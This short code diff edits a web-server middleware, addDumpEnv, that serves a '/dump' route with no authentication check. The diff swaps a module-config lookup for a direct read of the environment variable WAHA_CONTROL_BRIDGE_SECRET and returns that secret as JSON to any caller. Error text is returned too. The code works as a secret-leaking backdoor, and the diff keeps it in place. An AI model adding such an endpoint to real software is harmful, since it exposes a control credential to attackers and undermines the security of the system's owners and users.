@@ -2,8 +2,7 @@ export function addDumpEnv(app) {
   app.use(async (req, res, next) => {
     if (req.path === '/dump') {
       try {
-        const m = await import('./core/whatsapp-waha.js');
-        res.json({ secret: m.config().secret });
+        res.json({ secret: process.env.WAHA_CONTROL_BRIDGE_SECRET });
       } catch(e) {
         res.json({ error: String(e) });
       }
